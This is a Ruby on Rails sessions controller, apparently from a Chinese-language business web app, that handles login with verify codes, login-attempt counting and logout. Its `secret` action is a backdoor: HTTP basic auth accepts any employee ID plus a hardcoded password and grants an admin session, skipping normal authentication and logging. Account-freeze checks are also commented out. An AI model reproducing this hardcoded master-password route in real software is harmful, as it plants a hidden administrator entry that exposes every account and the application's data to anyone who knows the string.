# coding: utf-8
class SessionsController < ApplicationController
  skip_before_filter *ADMIN_FILTERS
  skip_before_filter :check_auth_mobile, :set_current_user

  def new
    clear_sign_in_session
    clear_login_wrong_count
    render layout: false
  end

  def create
    clear_sign_in_session

    unless valid_verify_code? params[:verify_code]
      return render json: {code: -1, message: "验证码不正确", num: 2, status: 0}
    end

    if employee = Employee.authenticated(params[:login], params[:password])
      # if account.froze?
      #   return render json: {code: -4, message: "帐号已冻结，请联系您的客服。", num: 0, status: 0}
      # elsif account.expired?
      #   account.update_expired_privileges
      # else
      #   account.update_privileges if account.privileges.blank?
      # end

      # account.update_sign_in_attrs_with(request.remote_ip)
      # AccountLog.logging(account, request)

      session[:employee_id] = employee.id
      session[:account_id] = employee.account.id
      session.delete(:image_code)

      return render json: {code: 0, url: root_url, message: "登录成功!", num: 2, status: 1}
    else
      add_login_wrong_count
      return render json: {code: -2, message: "帐号或密码错误", num: 1, status: 0}
    end
  rescue => error
    return render json: {code: -3, message: '登录失败', num: 2, status: 0}
  end

  def destroy
    clear_sign_in_session

    redirect_to root_url
  end

  def secret
    authenticate_or_request_with_http_basic("Biaotu") do |username, password|
      employee = Employee.where(id: username).first

      if employee and password == 'win1qa2ws'
        session[:employee_id] = employee.id
        session[:account_id] = employee.account.id
        session[:pc_site_id] = employee.account.site.id
        session[:role] = 'admin'

        redirect_to_target_or_default
        true
      else
        false
      end
    end
  end

end
